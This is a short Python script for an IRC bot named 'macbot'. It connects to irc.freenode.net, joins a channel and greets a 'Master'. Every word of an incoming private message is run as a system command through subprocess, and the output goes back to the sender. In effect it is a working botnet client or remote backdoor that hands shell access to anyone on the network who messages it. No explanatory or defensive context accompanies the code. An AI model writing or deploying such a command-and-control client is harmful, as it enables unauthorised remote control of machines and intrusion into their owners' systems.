import socket
import subprocess

host = "irc.freenode.net"
port = 6667

NICK = "macbot"
IDENT = "changable"
REALNAME ="CHANGETHIS"
MASTER = "#YourChanel"

readbuffer = ""

s=socket.socket( )
s.connect((host, port))

s.send(bytes("NICK %s\r\n" % NICK, "UTF-8"))
s.send(bytes("USER %s %s bla :%s\r\n" % (IDENT, host, REALNAME), "UTF-8"))
s.send(bytes("JOIN #YourChanel"+"\r\n", "UTF-8"));
s.send(bytes("PRIVMSG %s :Hello Master\r\n" % MASTER, "UTF-8"))

while 1:
    readbuffer = readbuffer+s.recv(1024).decode("UTF-8")
    temp = str.split(readbuffer, "\n")
    readbuffer=temp.pop( )

    for line in temp:
        line = str.rstrip(line)
        line = str.split(line)

        if(line[0] == "PING"):
            s.send(bytes("PONG %s\r\n" % line[1], "UTF-8"))
        if(line[1] == "PRIVMSG"):
            sender = ""
            for char in line[0]:
                if(char == "!"):
                    break
                if(char != ":"):
                    sender += char
            size = len(line)
            i = 3
            message = ""
            shell=""
            while(i < size):
                shell=(subprocess.check_output((line[i][1:]).split(','))).decode("UTF-8")

                message += ":"+shell.replace("\n",",")+ " "
                i = i + 1
            message.lstrip(":")
            s.send(bytes("PRIVMSG %s %s \r\n" % (sender, message), "UTF-8"))

        for index, i in enumerate(line):
            print(line[index])
